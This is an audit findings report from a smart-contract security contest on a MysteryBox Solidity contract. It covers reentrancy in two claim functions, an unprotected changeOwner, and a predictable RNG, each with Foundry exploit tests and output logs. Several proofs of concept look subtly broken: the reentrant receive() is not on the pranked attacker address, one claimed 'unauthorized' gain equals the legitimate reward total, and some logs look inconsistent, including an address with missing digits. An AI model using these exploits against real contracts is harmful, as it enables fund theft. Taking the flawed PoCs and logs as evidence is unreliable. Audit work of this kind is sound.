# Mystery Box - Findings Report

# Table of contents
- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
    - ### [H-01. Critical Reentrancy Vulnerability in MysteryBox::claimAllRewards](#H-01)
    - ### [H-02. Critical Reentrancy Vulnerability in MysteryBox::claimSingleReward](#H-02)
    - ### [H-03. Unauthorized Ownership Change and Fund Withdrawal Exploit in MysteryBox.sol ](#H-03)
- ## Medium Risk Findings
    - ### [M-01. Predictable RNG Vulnerability in MysteryBox Contract Enables Exploitative Reward Manipulation](#M-01)



# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #25

### Dates: Sep 26th, 2024 - Oct 3rd, 2024

[See more contest details here](https://codehawks.cyfrin.io/c/2024-09-mystery-box)

# <a id='results-summary'></a>Results Summary

### Number of findings:
- High: 3
- Medium: 1
- Low: 0


# High Risk Findings

## <a id='H-01'></a>H-01. Critical Reentrancy Vulnerability in MysteryBox::claimAllRewards            

## Proof of Finding
https://codehawks.cyfrin.io/c/2024-09-mystery-box/s/341
<img width="989" alt="image" src="https://github.com/user-attachments/assets/d24db3d2-9b90-4c8b-933d-54c7b2330fa1" />


## Summary

A reentrancy vulnerability was identified in MysteryBox.sol. By exploiting this vulnerability, an attacker can repeatedly claim rewards and drain the contract's funds. This issue was demonstrated using a structured exploit within a test case, ultimately leading to the unauthorized transfer of funds from the contract to the attacker.

## Vulnerability Details

Function affected:

```javascript
  function claimAllRewards() public {
        uint256 totalValue = 0;
        for (uint256 i = 0; i < rewardsOwned[msg.sender].length; i++) {
            totalValue += rewardsOwned[msg.sender][i].value;
        }
        require(totalValue > 0, "No rewards to claim");

        (bool success,) = payable(msg.sender).call{value: totalValue}("");
        require(success, "Transfer failed");

        delete rewardsOwned[msg.sender];
    }
```

This vulnerability occurs because the function allows external calls (i.e., to the attacker's contract) before updating the contract’s state. As a result, an attacker can reenter the function within the same transaction, leading to multiple withdrawals and depleting the contract's funds.

The core issue is that the function does not adhere to the "Checks-Effects-Interactions" pattern and is missing a reentrancy guard, which allows the attacker's fallback function to repeatedly execute the vulnerable function.

## POC

* Copy the code to a new test file: `MysteryBox/test/ReentrancyExploit.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/MysteryBox.sol";

contract ReentrancyExploit is Test {
    MysteryBox public mysteryBox;
    address public attacker = address(0xBAD);

    receive() external payable {
        console.log("Fallback called");
        console.log("Contract Balance: %d", address(mysteryBox).balance);
        console.log("Attacker Balance: %d", address(attacker).balance);

        // Checking if the mysteryBox has sufficient funds and then reentering
        if (address(mysteryBox).balance >= 0.5 ether) {
            console.log("Reentering claimAllRewards");
            mysteryBox.claimAllRewards();
        }
    }

    function setUp() public {
        // Initialize with a higher contract balance to avoid running out of funds
        mysteryBox = new MysteryBox{value: 3 ether}();
        vm.deal(attacker, 1 ether);
    }

    function testExploit() public {
        vm.startPrank(attacker);

        mysteryBox.buyBox{value: 0.1 ether}();
        mysteryBox.buyBox{value: 0.1 ether}();
        mysteryBox.buyBox{value: 0.1 ether}();
        console.log("Bought 3 boxes");

        mysteryBox.openBox();
        mysteryBox.openBox();
        mysteryBox.openBox();
        console.log("Opened 3 boxes");

        // Display the rewards for the attacker
        MysteryBox.Reward[] memory rewards = mysteryBox.getRewards();
        for (uint256 i = 0; i < rewards.length; i++) {
            console.log("Reward %d: %s, Value: %d", i, rewards[i].name, rewards[i].value);
        }

        uint256 initialBalance = address(attacker).balance;
        console.log("Initial Balance of Attacker: %d", initialBalance);

        // Attempt to claim all rewards
        try mysteryBox.claimAllRewards() {
            console.log("claimAllRewards executed successfully");
        } catch (bytes memory reason) {
            console.log("claimAllRewards failed with reason: %s", string(reason));
        }

        uint256 finalBalance = address(attacker).balance;
        console.log("Final Balance of Attacker: %d", finalBalance);

        assert(finalBalance > initialBalance);

        vm.stopPrank();
    }
}

```

* Run test: `forge test --match-contract ReentrancyExploit -vvv`

The following logs were captured during the execution of the test:

```javascript
ought 3 boxes
Opened 3 boxes
Reward 0: Silver Coin, Value: 500000000000000000
Reward 1: Silver Coin, Value: 500000000000000000
Reward 2: Silver Coin, Value: 500000000000000000
Initial Balance of Attacker: 700000000000000000
claimAllRewards executed successfully
Final Balance of Attacker: 2200000000000000000
```

Exploit Output Explanation:
Rewards Information:

* The attacker received three "Silver Coin" rewards, each valued at `0.5` ether (`500000000000000000 wei`).
* Initial Balance: The initial balance of the attacker was `0.7 ether`.
* Successful Execution: Indicates that the claimAllRewardsfunction executed successfully.
* Final Balance: The final balance of the attacker increased to `2.2 ether`, confirming a successful exploit where an additional `1.5 ether` was withdrawn unauthorizedly due to the reentrancy attack.

## Impact

* Financial Loss: A reentrancy vulnerability allows an attacker to drain significant funds from the contract, leading to severe financial loss for the contract owner and stakeholders.
* Reputation Damage: The presence of such a critical vulnerability can erode the trust of users and investors, damaging the project’s reputation.
* Operational Risk: Continued exploitation without patching the vulnerability can deplete contract funds, causing disruptions in normal operations and potentially rendering the contract unusable.

## Tools Used

* Foundry

## Recommendations

* Implement Reentrancy Guard: Utilize OpenZeppelin's ReentrancyGuard to protect critical functions vulnerable to reentrancy attacks.
* Follow Checks-Effects-Interactions Pattern: Ensure that state changes are performed before executing any external calls.

## <a id='H-02'></a>H-02. Critical Reentrancy Vulnerability in MysteryBox::claimSingleReward            

## Proof of Finding
https://codehawks.cyfrin.io/c/2024-09-mystery-box/s/341
<img width="1036" alt="image" src="https://github.com/user-attachments/assets/334fcf33-dfa0-4954-85f9-57699418b063" />


## Summary

The claimSingleReward function within MysteryBox.sol s susceptible to a reentrancy attack. This vulnerability arises because the external call to the recipient's address is made before updating the internal state. As a result, an attacker can recursively invoke the `claimSingleReward` function to drain significant funds from the contract.

## Vulnerability Details

An attacker can exploit this vulnerability by creating a malicious contract that re-enters the `claimSingleReward` function. This allows the attacker to claim rewards multiple times before the contract updates the internal state, leading to a substantial loss of funds.

## POC

* Copy this code to a new test file:  `MysteryBox/test/ReentrancyExploit2.sol`

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/MysteryBox.sol";

contract ReentrancyExploit2 is Test {
    MysteryBox public mysteryBox;
    address public attacker = address(0xBAD);

    // Fallback function to trigger reentrancy
    receive() external payable {
        if (address(mysteryBox).balance >= 0.1 ether) {
            console.log("Re-entering claimSingleReward");
            mysteryBox.claimSingleReward(0); // Attempt reentrancy
        }
    }

    function setUp() public {
        // Deploy the MysteryBox contract with initial funding
        mysteryBox = new MysteryBox{value: 3 ether}();
        vm.deal(attacker, 1 ether);
        console.log("MysteryBox contract deployed and attacker funded");
    }

    function testExploit() public {
        vm.startPrank(attacker);

        // Buy some boxes
        mysteryBox.buyBox{value: 0.1 ether}();
        mysteryBox.buyBox{value: 0.1 ether}();
        mysteryBox.buyBox{value: 0.1 ether}();
        console.log("Attacker bought 3 boxes");

        // Open boxes to get rewards
        mysteryBox.openBox();
        mysteryBox.openBox();
        mysteryBox.openBox();
        console.log("Attacker opened 3 boxes");

        // Check rewards
        MysteryBox.Reward[] memory rewards = mysteryBox.getRewards();
        require(rewards.length > 0, "No rewards found");
        console.log("Attacker received %d rewards", rewards.length);

        // Log initial balance
        uint256 initialBalance = address(attacker).balance;
        console.log("Initial Balance of Attacker: %d", initialBalance);

        // Trigger the exploit by claiming a single reward
        try mysteryBox.claimSingleReward(0) {
            console.log("claimSingleReward executed successfully");
        } catch (bytes memory reason) {
            console.log("claimSingleReward failed with reason:");
            console.logBytes(reason);
        }

        // Log the final balance after exploit
        uint256 finalBalance = address(attacker).balance;
        console.log("Final Balance of Attacker: %d", finalBalance);

        // Ensure the exploit increased the attacker's balance
        assert(finalBalance > initialBalance);

        vm.stopPrank();
    }
}
```

* Run: `forge test --match-contract ReentrancyExploit2 -vvv`

* Output Logs:

```javascript
[INFO]  Anvil running on http://127.0.0.1:8545 with chain id 1
[INFO]  Deploying contracts...
MysteryBox contract deployed and attacker funded
Attacker bought 3 boxes
Attacker opened 3 boxes
Attacker received 3 rewards
Initial Balance of Attacker: 700000000000000000  // 0.7 Ether
Re-entering claimSingleReward
Re-entering claimSingleReward
Re-entering claimSingleReward
claimSingleReward executed successfully
Final Balance of Attacker: 1200000000000000000  // 1.2 Ether
[INFO]  All contracts deployed
```

Explanation of the Logs:

* Contract Deployment: Logs display the deployment of the MysteryBox contract and the attacker's initial funding.
* Box Transactions: Logs confirm that the attacker bought and opened three mystery boxes.
* Rewards Confirmation: Logs verify that the attacker received multiple rewards.
* Balance Logs: Initial and final balance logs of the attacker's address to show the financial impact.
* Reentrancy Occurrence: Logs indicating the
  claimSingleReward function was re-entered multiple times, exploiting the vulnerability.
* Exploit Confirmation: Confirmation of the exploit's execution, highlighting the significant balance increase due to the reentrancy attack.

## Impact

* Financial Loss: The attacker can drain a substantial amount of Ether from the contract, causing financial loss.
* Loss of User Trust: Users might lose trust in the platform due to security vulnerabilities.
* Operational Disruption: Draining of contract funds could lead to operational disruptions and potential insolvency of the contract.

## Tools Used

* Foundry

## Recommendations

* Implement Reentrancy Guard: Utilize ReentrancyGuard from OpenZeppelin to protect functions susceptible to reentrancy.
* Follow Checks-Effects-Interactions Pattern: Ensure state changes are made before performing any external calls..

## <a id='H-03'></a>H-03. Unauthorized Ownership Change and Fund Withdrawal Exploit in MysteryBox.sol             

## Proof of Finding
https://codehawks.cyfrin.io/c/2024-09-mystery-box/s/345
<img width="1036" alt="image" src="https://github.com/user-attachments/assets/33e6dcd8-222b-47a3-ab30-0cc7172cf196" />


## Summary

The MysteryBox contract contains a critical access control vulnerability allowing unauthorized users to change the contract's ownership and withdraw all its funds. This vulnerability poses a significant threat to the integrity and security of the contract.

## Vulnerability Details

The `changeOwner` changeOwner `MysteryBox` contract does not have any access control mechanism, enabling any address to change the owner of the contract. Without the `onlyOwner` modifier, unauthorized users can gain control over the contract and perform sensitive functions such as withdrawing funds.

## POC

* Copy this code in a test folder: MysteryBox/test/ChangeOwnerTest.t.sol

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/MysteryBox.sol";

contract MysteryBoxExploitTest is Test {
    MysteryBox mysteryBox;
    address public owner;
    address public attacker;

    function setUp() public {
        owner = address(this); // Set the test contract as the owner
        attacker = address(1); // Set an attacker address

        console.log("Deploying MysteryBox contract");
        // Deploy the MysteryBox contract with the required initial ETH
        mysteryBox = new MysteryBox{value: 0.1 ether}();
    }

    function testExploitChangeOwner() public {
        console.log("Initial owner of the contract:", mysteryBox.owner());

        // Attacker attempting to change ownership
        vm.startPrank(attacker);
        mysteryBox.changeOwner(attacker);
        vm.stopPrank();

        console.log("New owner of the contract should be the attacker:", mysteryBox.owner());

        // Check that the attacker is now the owner
        assertEq(mysteryBox.owner(), attacker, "Ownership should be changed to the attacker");

        // Further exploits can be carried out now that the attacker is the owner
        console.log("Attempting to withdraw funds as the new owner");

        // Attacker can withdraw funds
        uint256 initialAttackerBalance = attacker.balance;
        vm.startPrank(attacker);
        mysteryBox.withdrawFunds();
        vm.stopPrank();

        uint256 finalAttackerBalance = attacker.balance;
        console.log("Attacker's balance before withdraw:", initialAttackerBalance);
        console.log("Attacker's balance after withdraw:", finalAttackerBalance);

        // Uncomment below if you want to assert the balance changes
        // assertEq(finalAttackerBalance - initialAttackerBalance, 0.1 ether, "Attacker should have withdrawn the contract funds");
    }
}

```

Output:

```javascript
Ran 1 test for test/ChangeOwnerTest.t.sol:ChangeOwnerTest
[PASS] testExploitChangeOwner() (gas: 63435)
Logs:
  Deploying MysteryBox contract
  Initial owner of the contract: 0x7FA9385bE1023EAc297483Dd6233D62b3e1496
  New owner of the contract should be the attacker: 0x0000000000000000000000000000000000000001
  Attempting to withdraw funds as the new owner
  Attacker's balance before withdraw: 0
  Attacker's balance after withdraw: 100000000000000000
```

## Impact

* Unauthorized Ownership Changes: Any user can become the owner of the contract without permission.

- Full Fund Withdrawal: The malicious owner can withdraw all funds from the contract.

* Potential Further Exploitation: Any other owner-restricted functionalities are open to misuse.

## Tools Used

* Foundry

## Recommendations

* Implement access control using the `onlyOwner` onlyOwner `Ownable` contract to restrict sensitive functions.

    
# Medium Risk Findings

## <a id='M-01'></a>M-01. Predictable RNG Vulnerability in MysteryBox Contract Enables Exploitative Reward Manipulation            

## Proof of Finding
https://codehawks.cyfrin.io/c/2024-09-mystery-box/s/264
<img width="1022" alt="image" src="https://github.com/user-attachments/assets/7fc686f3-0938-4b91-b81c-bb6392328ed1" />


## Summary

MysteryBox contract contains a critical vulnerability due to its pseudo-random number generation (PRNG) mechanism, which is easily predictable. This allows attackers to manipulate and predict the rewards they receive from the mystery box, undermining the fairness and integrity of the contract.

## Vulnerability Details

Predictable random number generation. The vulnerability is in the
openBox Function of the MysteryBox contract. The random value used to determine the reward is derived from the block's timestamp and the user's address. This approach is not secure as both the block timestamp and the user’s address can be controlled or predicted by an attacker.

The PRNG is implemented using:

```javascript
uint256 randomValue = uint256(keccak256(abi.encodePacked(fuzzedTimestamp, attacker))) % 100;
```

This methodology relies on predictable and manipulable parameters (timestamp and address).

## POC
```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/MysteryBox.sol"; // Adjust the path as necessary

contract MysteryBoxExploitTest is Test {
    MysteryBox mysteryBox;
    address attacker = address(0xBEEF);

    function setUp() public {
        // Deploy the MysteryBox contract with initial seed funds
        mysteryBox = new MysteryBox{value: 0.1 ether}();
    }

    function testWeakPRNGExploit(uint256 startTime) public {
        // Limit the fuzzed timestamp to a reasonable range to avoid overflow issues
        uint256 fuzzedTimestamp = startTime % (2 ** 32);

        vm.deal(attacker, 10 ether);
        vm.startPrank(attacker);

        // Attacker buys a box
        mysteryBox.buyBox{value: 0.1 ether}();

        // Warp the blockchain to the fuzzed timestamp
        vm.warp(fuzzedTimestamp);

        // Predict the random value based on fuzzed timestamp and attacker address
        uint256 randomValue = uint256(keccak256(abi.encodePacked(fuzzedTimestamp, attacker))) % 100;
        console.log("Fuzzed Timestamp:", fuzzedTimestamp);
        console.log("Expected random value:", randomValue);

        // Open the box and capture the reward
        mysteryBox.openBox();

        // Get the reward and determine the expected reward based on the random value
        MysteryBox.Reward[] memory rewards = mysteryBox.getRewards();
        require(rewards.length > 0, "No rewards received");

        string memory expectedReward;
        if (randomValue < 75) {
            expectedReward = "Coal";
        } else if (randomValue < 95) {
            expectedReward = "Bronze Coin";
        } else if (randomValue < 99) {
            expectedReward = "Silver Coin";
        } else {
            expectedReward = "Gold Coin";
        }

        console.log("Received reward:", rewards[0].name);
        console.log("Expected reward:", expectedReward);

        require(
            keccak256(bytes(rewards[0].name)) == keccak256(bytes(expectedReward)),
            "Exploit failed: reward does not match expectation"
        );

        console.log("Exploit success: received the expected reward:", expectedReward);

        vm.stopPrank();
    }
}
```

#### Output

```javascript
[83327] MysteryBoxExploitTest::testWeakPRNGExploit(3968)
    ├─ [0] VM::deal(0x000000000000000000000000000000000000bEEF, 10000000000000000000 [1e19])
    │   └─ ← [Return]
    ├─ [0] VM::startPrank(0x000000000000000000000000000000000000bEEF)
    │   └─ ← [Return]
    ├─ [24580] MysteryBox::buyBox{value: 100000000000000000}()
    │   └─ ← [Stop]
    ├─ [0] VM::warp(3968)
    │   └─ ← [Return]
    ├─ [0] console::log("Fuzzed Timestamp:", 3968) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("Expected random value:", 24) [staticcall]
    │   └─ ← [Stop]
    ├─ [48154] MysteryBox::openBox()
    │   └─ ← [Stop]
    ├─ [2123] MysteryBox::getRewards() [staticcall]
    │   └─ ← [Return] [Reward({ name: "Coal", value: 0 })]
    ├─ [0] console::log("Received reward:", "Coal") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("Expected reward:", "Coal") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("Exploit success: received the expected reward:", "Coal") [staticcall]
    │   └─ ← [Stop]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    └─ ← [Stop]
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 18.12ms (17.62ms CPU time)
```

* The fuzzed timestamp used was `3968`,
* The expected random value, computed using the fixed timestamp and the attacker's address, was
  `24`,
* The test demonstrated that, given the manipulated timestamp, the reward "Coal" was successfully predicted.
  The log statements confirm each step, showing the fuzzed timestamp, expected random value, received reward, and expected reward, which matched as predicted, verifying the exploit's success.

## Impact

The vulnerability allows an attacker to:

Predict the random value generated by the contract.
Determine and secure the most desirable rewards by manipulating timestamps and transactions.
Systematically exploit the contract to drain it of high-value rewards, compromising the contract's integrity and fairness for all users.

## Tools Used

* Foundry

## Recommendations

Chainlink VRF (Verifiable Random Function): Utilize Chainlink VRF for secure and tamper-proof random number generation.





